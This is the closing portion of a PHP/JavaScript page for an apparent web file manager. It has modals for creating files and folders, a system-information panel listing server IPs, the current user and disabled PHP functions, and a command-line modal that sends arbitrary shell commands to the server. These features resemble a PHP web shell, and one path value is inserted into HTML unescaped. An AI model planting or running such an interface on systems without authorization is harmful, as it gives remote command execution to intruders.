                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                            <span>Create New File</span>
                        </h2>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <label class="form-label">Filename</label>
                            <input type="text" name="filename" class="form-input" placeholder="Enter filename (e.g., script.php)" required autofocus>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Content</label>
                            <textarea name="content" class="form-textarea" rows="10" placeholder="Enter file content here..."></textarea>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary">
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                            </svg>
                            <span>Create</span>
                        </button>
                        <button type="button" class="btn btn-secondary" data-modal-close>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Cancel</span>
                        </button>
                    </div>
                </form>
            `;
            Modal.open(html, 'modal-lg');
        }

        // New Folder Modal
        function showNewFolderModal(dirPath) {
            const html = `
                <form data-ajax method="post">
                    <input type="hidden" name="ajax_newfolder" value="1">
                    <input type="hidden" name="path" value="${dirPath}">
                    <div class="modal-header">
                        <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                            </svg>
                            <span>Create New Folder</span>
                        </h2>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <label class="form-label">Folder Name</label>
                            <input type="text" name="foldername" class="form-input" placeholder="Enter folder name" required autofocus>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary">
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                            </svg>
                            <span>Create</span>
                        </button>
                        <button type="button" class="btn btn-secondary" data-modal-close>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Cancel</span>
                        </button>
                    </div>
                </form>
            `;
            Modal.open(html);
        }

        // Command Modal
        function showCommandModal(encryptedPath) {
            const html = `
                <form method="post" id="commandForm">
                    <input type="hidden" name="ajax_command" value="1">
                    <input type="hidden" name="path" value="${escapeHtml(encryptedPath)}">
                    <div class="modal-header">
                        <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                            </svg>
                            <span>Command Line</span>
                        </h2>
                    </div>
                    <div class="modal-body">
                        <div class="form-group" style="margin-bottom: 16px;">
                            <label class="form-label">Command</label>
                            <div style="position: relative;">
                                <span style="position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--primary); font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: bold; font-size: 14px;">$</span>
                                <input type="text" name="command" class="form-input" style="padding-left: 36px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;" placeholder="Enter command (e.g., ls -la)" required autofocus autocomplete="off">
                            </div>
                        </div>
                        <div id="commandOutputContainer" style="display: none;">
                            <label class="form-label" style="display: flex; justify-content: space-between; align-items: center;">
                                <span>Output</span>
                                <span style="font-size: 11px; color: var(--on-surface-variant); font-weight: normal;">Scrollable</span>
                            </label>
                            <pre id="commandOutputPre" style="background-color: var(--surface-container-highest); color: var(--primary); padding: 16px; border-radius: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; line-height: 1.5; overflow: auto; max-height: 350px; margin: 0; white-space: pre-wrap; word-break: break-word;"></pre>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary" id="cmdExecuteBtn">
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                            </svg>
                            <span>Execute</span>
                        </button>
                        <button type="button" class="btn btn-secondary" data-modal-close>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Close</span>
                        </button>
                    </div>
                </form>
            `;
            Modal.open(html, 'modal-lg');

            // Get references after modal is opened
            const form = document.getElementById('commandForm');
            const outputContainer = document.getElementById('commandOutputContainer');
            const outputPre = document.getElementById('commandOutputPre');
            const executeBtn = document.getElementById('cmdExecuteBtn');

            // Form submission for command modal
            form.addEventListener('submit', function (e) {
                e.preventDefault();

                const formData = new FormData(form);
                const command = formData.get('command');

                if (!command || !command.trim()) {
                    showAlert('Please enter a command', 'error');
                    return;
                }

                // Show loading state
                Modal.setLoading(executeBtn, true);
                outputContainer.style.display = 'block';
                outputPre.textContent = 'Executing...';
                outputPre.style.color = 'var(--primary)';

                const params = new URLSearchParams();
                params.append('ajax_command', '1');
                params.append('path', encryptedPath);
                params.append('command', command);

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: params.toString()
                })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('HTTP error! status: ' + response.status);
                        }
                        return response.json();
                    })
                    .then(data => {
                        Modal.setLoading(executeBtn, false);
                        if (data.success) {
                            const output = data.output !== undefined && data.output !== null && data.output !== ''
                                ? data.output
                                : '(Command executed with no output)';
                            outputPre.textContent = output;
                            outputPre.style.color = 'var(--primary)';
                        } else {
                            outputPre.textContent = 'Error: ' + (data.message || 'Command failed');
                            outputPre.style.color = 'var(--error)';
                        }
                        // Scroll to bottom
                        outputPre.scrollTop = outputPre.scrollHeight;
                    })
                    .catch(error => {
                        Modal.setLoading(executeBtn, false);
                        outputContainer.style.display = 'block';
                        outputPre.textContent = 'Error: ' + error.message;
                        outputPre.style.color = 'var(--error)';
                    });
            });
        }

        // Information Modal
        function showInfoModal() {
            const html = `
                <div class="modal-header">
                    <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                        <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <span>System Information</span>
                    </h2>
                </div>
                <div class="modal-body">
                    <div id="infoContent" style="display: flex; align-items: center; justify-content: center; min-height: 200px;">
                        <div style="color: var(--on-surface-variant);">Loading...</div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-modal-close>
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                        <span>Close</span>
                    </button>
                </div>
            `;
            Modal.open(html, 'modal-lg');

            const infoContent = document.getElementById('infoContent');
            const baseUrl = window.location.pathname;

            fetch(baseUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'ajax_info=1'
            })
            .then(response => response.text())
            .then(text => {
                try {
                    const data = JSON.parse(text);
                    if (data.success) {
                    const info = data.info;
                    infoContent.innerHTML = `
                        <div style="width: 100%; max-height: 400px; overflow-y: auto;">
                            <div style="display: grid; gap: 16px;">
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">PHP</div>
                                    <div style="display: grid; gap: 8px; font-size: 13px;">
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Version</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.version)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">SAPI</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.sapi)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Memory Limit</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.memory_limit)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Max Execution</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.max_execution_time)}s</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Upload Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.upload_max_filesize)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Post Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.post_max_size)}</span></div>
                                    </div>
                                </div>
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">System</div>
                                    <div style="display: grid; gap: 8px; font-size: 13px;">
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">OS</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.os)} (${escapeHtml(info.system.os_family)})</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Hostname</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.hostname)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">User</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.current_user)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Temp Dir</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.temp_dir)}</span></div>
                                    </div>
                                </div>
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Server</div>
                                    <div style="display: grid; gap: 8px; font-size: 13px;">
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Software</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.software)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server Name</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.name)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Document Root</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.document_root)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Remote IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.remote_addr)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.server_addr)}</span></div>
                                    </div>
                                </div>
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Storage</div>
                                    <div style="display: grid; gap: 8px; font-size: 13px;">
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Total</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.total)}</span></div>
                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Free</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.free)}</span></div>
                                    </div>
                                </div>
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Database Extensions</div>
                                    <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                                        ${info.databases.length > 0
                                            ? info.databases.map(db => `<span style="background: var(--surface-container); color: var(--on-surface); padding: 4px 10px; border-radius: 8px; font-size: 12px; font-family: monospace;">${escapeHtml(db)}</span>`).join('')
                                            : '<span style="color: var(--on-surface-variant); font-size: 13px;">None loaded</span>'
                                        }
                                    </div>
                                </div>
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Loaded Extensions (${info.php.extensions.length})</div>
                                    <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 120px; overflow-y: auto;">
                                        ${info.php.extensions.map(ext => `<span style="background: var(--surface-container); color: var(--on-surface-variant); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(ext)}</span>`).join('')}
                                    </div>
                                </div>
                                ${info.disabled_functions.length > 0 ? `
                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                                    <div style="font-weight: 600; color: var(--error); margin-bottom: 12px; font-size: 14px;">Disabled Functions (${info.disabled_functions.length})</div>
                                    <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 100px; overflow-y: auto;">
                                        ${info.disabled_functions.map(fn => `<span style="background: var(--error-container); color: var(--on-error-container); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(fn.trim())}</span>`).join('')}
                                    </div>
                                </div>
                                ` : ''}
                            </div>
                        </div>
                    `;
                } else {
                    infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(data.message || 'Failed to load info')}</div>`;
                }
                } catch (e) {
                    infoContent.innerHTML = `<div style="color: var(--error);">Error parsing response: ${escapeHtml(text.substring(0, 200))}</div>`;
                }
            })
            .catch(error => {
                infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(error.message)}</div>`;
            });
        }

        // Utility function to escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Search functionality
        function initSearch() {
            const searchInput = document.getElementById('fileSearch');
            if (!searchInput) return;

            const desktopRows = document.querySelectorAll('#desktopFileTable tbody tr.file-row');
            const mobileCards = document.querySelectorAll('#mobileFileList .file-card');
            const emptyState = document.getElementById('emptyState');
            const desktopTable = document.getElementById('desktopFileTable');
            const mobileList = document.getElementById('mobileFileList');

            searchInput.addEventListener('input', function () {
                const query = this.value.toLowerCase().trim();
                let visibleCount = 0;

                // Filter desktop rows
                desktopRows.forEach(row => {
                    const filename = row.getAttribute('data-filename');
                    if (filename && filename.includes(query)) {
                        row.style.display = '';
                        visibleCount++;
                    } else {
                        row.style.display = 'none';
                    }
                });

                // Filter mobile cards
                mobileCards.forEach(card => {
                    const filename = card.getAttribute('data-filename');
                    if (filename && filename.includes(query)) {
                        card.style.display = '';
                    } else {
                        card.style.display = 'none';
                    }
                });

                // Show/hide empty state
                if (visibleCount === 0 && query !== '') {
                    emptyState.classList.remove('hidden');
                    if (desktopTable) desktopTable.style.display = 'none';
                    if (mobileList) mobileList.style.display = 'none';
                } else {
                    emptyState.classList.add('hidden');
                    if (desktopTable) desktopTable.style.display = '';
                    if (mobileList) mobileList.style.display = '';
                }
            });
        }

        // Display all stored alerts once the page is loaded
        document.addEventListener('DOMContentLoaded', function () {
            <?php
            // Output the JavaScript code to show all buffered alerts using json_encode for safety
            foreach ($alertMessages as $alert) {
                echo "showAlert(" . json_encode($alert['message']) . ", " . json_encode($alert['type']) . ");\n";
            }
            ?>

            // Initialize search
            initSearch();

        });
    </script>
</body>

</html>